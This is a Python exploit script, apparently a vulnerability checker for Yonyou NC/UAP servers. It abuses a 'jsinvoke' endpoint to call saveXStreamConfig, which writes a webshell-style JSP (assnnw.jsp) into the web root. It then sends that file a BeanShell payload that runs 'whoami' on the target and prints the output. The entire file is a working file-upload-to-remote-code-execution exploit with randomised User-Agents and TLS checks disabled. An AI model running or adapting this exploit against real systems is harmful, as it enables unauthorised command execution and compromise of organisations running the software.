#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import random
import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()


#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

def upload(url):
	cmd_url = url + '/assnnw.jsp?error=bsh.Interpreter'
	cmd_data = '''cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream())'''
	try:
		res2 = requests.post(cmd_url,headers=headers,data=cmd_data,timeout=10,verify=False)
		if res2.status_code == 200:
			rsp_cmd = res2.text.replace("\r", "").replace("\n", "")
			print("[+]漏洞存在，执行 whoami 的命令，结果为：{}".format(rsp_cmd))
			return 1
		else:
			print("[-]文件未上传成功".format(cmd_url))
	except Exception as e:
		print ("[-]请求异常".format(cmd_url))
		
#upload
def check_vuln(site):
	#清洗url
	url =  site + '/uapjs/jsinvoke/?action=invoke'
	global headers
	headers = {
		'User-Agent': get_ua(),
		'Content-Type': 'application/x-www-form-urlencoded',
	}	
	upload_data ='''{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/assnnw.jsp"]}'''
	res1 = requests.post(url,headers=headers,data=upload_data,timeout=10,verify=False)
	if upload(site) == 1:
		print("[+]漏洞存在")
		
if __name__ == '__main__':
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 yonyou-cloud-jsinvoke-uploadfile.py ",target)
    check_vuln(target)
